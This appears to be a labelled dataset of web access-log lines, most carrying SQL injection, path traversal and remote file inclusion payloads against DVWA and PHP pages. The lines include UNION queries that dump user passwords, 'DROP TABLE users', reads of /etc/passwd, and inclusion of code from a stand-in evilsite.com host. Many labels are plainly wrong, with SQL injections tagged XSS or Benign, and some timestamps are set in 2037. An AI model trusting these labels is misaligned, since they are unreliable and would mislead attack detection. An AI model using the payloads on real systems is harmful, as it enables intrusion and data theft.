+76.186.22.123 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1   500 295  ,XSS
+126.160.178.117 , [12/Mar/2023:08:29:11 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+*+FROM+users%23&Submit=Submit HTTP/1.1   500 295 ,Benign
+189.56.115.126 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2C+password+FROM+users%23&Submit=Submit HTTP/1.1   200 1889 ,XSS
+216.41.252.154 , [27/Dec/2037:12:00:00 +0530] ,GET login/?id=%27+or+1=1%23 HTTP/1.1   200 1568  ,SQL Injection
+73.185.129.143 , [09/Mar/2022:17:00:55 +0800] ,GET login/?id=%27+or+1=1%23 HTTP/1.1   200 1662  ,SQL Injection
+177.5.173.234 , [25/Jun/2020:03:09:12 +0000] ,GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1   200 1117  ,Benign
+24.127.25.211 , [07/Mar/2022:16:15:53 +0800] ,GET login/?id=27+or+1+%3D+1%3B+--+&Submit=Submit HTTP/1.1   200 1229  ,Benign
+251.195.134.192 , [22/May/2012:00:16:54 +0000] ,GET login/?id=admin%27+-- HTTP/1.1   200 1048  ,XSS
+53.154.17.222 , [13/Mar/2022:00:29:53 +0800] ,GET login/?id=admin%27+-- HTTP/1.1   200 1139  ,XSS
+25.149.74.99 , [07/Mar/2022:16:41:41 +0800] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1   200 1211  ,XSS
+159.76.175.153 , [13/Mar/2022:00:14:02 +0800] ,GET login/?id=SELECT+%2A+FROM+members+WHERE+%271%27%3D%271%27+--&Submit=Submit HTTP/1.1   200 1302  ,Benign
+213.168.167.14 , [13/Mar/2022:00:14:02 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%22%20or%20%22%22%2A%22&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,XSS
+119.13.171.252 , [10/Mar/2023:04:27:28 -0500] ,GET /dvwa/vulnerabilities/sqli/?id=%20WHERE%201%3D1%20AND%201%3D1%23&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
+226.135.132.208 , [13/Mar/2022:00:04:04 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=%20UNION%20SELECT%20%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1672  ,XSS
+111.64.225.233 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27%20UNION%20SELECT%20sum%28columnname%20%29%20from%20tablename%20--&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
+105.65.229.3 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20GROUP%20BY%201%2C2%2C--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1676  ,XSS
+231.82.90.50 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27%20ORDER%20BY%202--%2B&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,Benign
+80.115.31.27 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=admin%22%20or%20%221%22%3D%221&Submit=Submit&user_token=5c5f05693736e9c5aec2f293cf7f2045 HTTP/1.1   200 1674  ,XSS
+118.77.137.250 , [21/Feb/2022:14:43:44 +0800] ,GET /products.php?categoryid=1%20OR%201=1;-- HTTP/1.1   200 1432 ,SQL Injection
+43.229.2.75 ,  [27/Dec/2037:12:00:00 +0530] ,GET /search.php?search_query=%27;DROP%20TABLE%20users;-- HTTP/1.1   500 1432 ,XSS
+219.97.45.99 , [25/Jun/2020:03:09:12 +0000] ,"GET /profile.php?id=1234%20UNION%20SELECT%20username,password%20FROM%20users;-- HTTP/1.1   200 1203 ",XSS
+23.129.201.70 , [21/Feb/2022:14:11:25 +0800] ,GET /articles.php?id=1%20OR%20SLEEP(10);-- HTTP/1.1   200 1203 ,SQL Injection
+63.152.131.214 , [16/Mar/2023:03:41:51 -0400] ,GET /search.php?q=foo%27;DROP%20TABLE%20users;%20-- HTTP/1.1    200 1123 ,XSS
+151.150.60.10 , [22/May/2012:00:16:54 +0000] ,GET /search.php?q=foo%27%3B%20SELECT%20*%20FROM%20users%3B%20-- HTTP/1.1  200 1123 ,Benign
+37.115.39.198 , [27/Dec/2037:12:00:00 +0530] ,GET /usr/login HTTP/1.1  502 4950 ,Benign
+190.93.45.35 , [09/Mar/2022:17:05:30 +0800] ,POST /usr/admin/developer HTTP/1.1  502 4955 ,Benign
+207.230.69.98 , [10/Mar/2023:05:32:31 -0500] ,GET /usr/admin/developer HTTP/1.1  303 5005 ,XSS
+113.68.228.79 , [22/May/2012:00:16:54 +0000] ,POST /usr/login HTTP/1.1  403 4995 ,SQL Injection
+234.65.208.188 , [13/Mar/2022:00:04:41 +0800] ,PUT /usr/register HTTP/1.1  200 4980 ,SQL Injection
+156.55.85.104 , [09/Mar/2022:17:00:52 +0800] ,GET /usr/register HTTP/1.1  404 4989 ,SQL Injection
+206.146.184.146 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd HTTP/1.1  200 2451 ,Benign
+57.162.38.175 , [07/Mar/2023:10:44:02 -0500] ,GET /dvwa/vulnerabilities/fi/?page=../../hackable/flags/fi.php HTTP/1.1  200 1586 ,Local File Inclusion
+140.56.220.61 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/fi/?page=include.php HTTP/1.1  200 1657 ,SQL Injection
+165.185.27.172 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/view_source.php?id=fi&security=low HTTP/1.1  200 1024 ,SQL Injection
+114.132.189.194 , [09/Mar/2022:17:00:51 +0800] ,GET /dvwa/vulnerabilities/view_help.php?id=fi&security=low&locale=en HTTP/1.1  200 1997 ,Local File Inclusion
+140.95.4.108 , [09/Mar/2022:17:02:45 +0800] ,GET /dvwa/vulnerabilities/fi?page=http://www.evilsite.com/evil.php HTTP/1.1  301 678 ,SQL Injection
+159.119.72.203 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/dvwa/css/source.css HTTP/1.1  200 533 ,Benign
+204.79.96.97 , [13/Mar/2022:00:51:52 +0800] ,GET /dvwa/vulnerabilities/fi/?page=http://www.evilsite.com/evil.php HTTP/1.1  200 1375 ,Local File Inclusion
+2.33.140.255 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=SELECT+%40%40version&Submit=Submit HTTP/1.1  200 1667 ,Benign
+191.213.254.168 , [12/Mar/2023:08:29:11 -0400] ,GET /dvwa/vulnerabilities/sqli/?id=1234+SQL%40%40version&Submit=Submit HTTP/1.1  200 1667 ,XSS
+225.2.38.212 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,Benign
+69.67.136.64 , [27/Dec/2037:12:00:00 +0530] ,GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users%23&Submit=Submit HTTP/1.1  200 1888 ,XSS
+20.80.137.228 , [09/Mar/2022:17:00:55 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,Benign
+11.133.86.242 , [25/Jun/2020:03:09:12 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+version+FROM+v%24instance&Submit=Submit HTTP/1.1  500 295 ,XSS
+254.8.2.147 ,  [07/Mar/2022:16:15:53 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+%40%40version&Submit=Submit HTTP/1.1  500 295 ,XSS
+205.216.156.251 , [22/May/2012:00:16:54 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=1%27SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,SQL Injection
+3.84.177.201 , [13/Mar/2022:00:29:53 +0800] ,GET /dvwa/vulnerabilities/sqli/?id=1%27UNION+SELECT+*+FROM+information_schema.tables&Submit=Submit HTTP/1.1  500 295 ,XSS
+250.192.99.47 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%24getid+%3D+%22SELECT+first_name%2C+last_name+FROM+users+WHERE+user_id+%3D+%27%24id%27%22%3B&Submit=Submit HTTP/1.1  500 295 ,Benign
+255.138.9.103 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+%270%27%3D%270&Submit=Submit HTTP/1.1  200 1751 ,Local File Inclusion
+4.9.77.17 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+or+0%3D0+union+select+null%2C+version%28%29+%23&Submit=Submit HTTP/1.1  200 1798 ,Benign
+237.19.9.40 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+table_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1  200 2428 ,Local File Inclusion
+64.19.186.41 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D-0+union+select+null%2C+table_name+from+information_schema.tables+where+table_name+like%27user%25%27+%23&Submit=Submit HTTP/1.1  200 1797 ,Benign
+210.169.75.0 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28table_name%2C0x0a%2Ccolumn-name%29+from+information_schema.columns+where+table_name+%3D+%27users%27+%23&Submit=Submit HTTP/1.1  500 295 ,Benign
+254.140.45.91 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%25%27+and+1%3D0+union+select+null%2C+concat%28first_name%2C0x0a%2Clast_name%2C0x0a%2Cuser%2C0x0a%2Cpassword%29+from+users+%23&Submit=Submit HTTP/1.1  200 1945 ,XSS
+210.81.40.187 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+1%2C%40%40version%23&Submit=Submit HTTP/1.1  200 1727 ,Benign
+182.38.251.218 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40hostname+%23&Submit=Submit HTTP/1.1  200 1715 ,Benign
+232.3.116.67 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+order+by+1+%23&Submit=Submit HTTP/1.1  200 1667 ,SQL Injection
+64.65.224.2 ,  [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+all+select+system_user%28%29%2Cuser%28%29+%23&Submit=Submit HTTP/1.1  200 1721 ,Benign
+149.28.227.169 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cdatabase%28%29+%23&Submit=Submit HTTP/1.1  200 1714 ,Benign
+100.165.47.222 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Cschema_name+from+information_schema.schemata+%23&Submit=Submit HTTP/1.1  200 1741 ,Benign
+240.65.162.235 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2Ctable_name+from+information_schema.tables+%23&Submit=Submit HTTP/1.1  200 2399 ,Benign
+88.128.176.245 , [27/Aug/2011:03:09:46 +0000] ,GET /dvwa/vulnerabilities/sqli/?id=%27+union+select+null%2C%40%40datadir+%23&Submit=Submit HTTP/1.1  200 1721 ,Benign
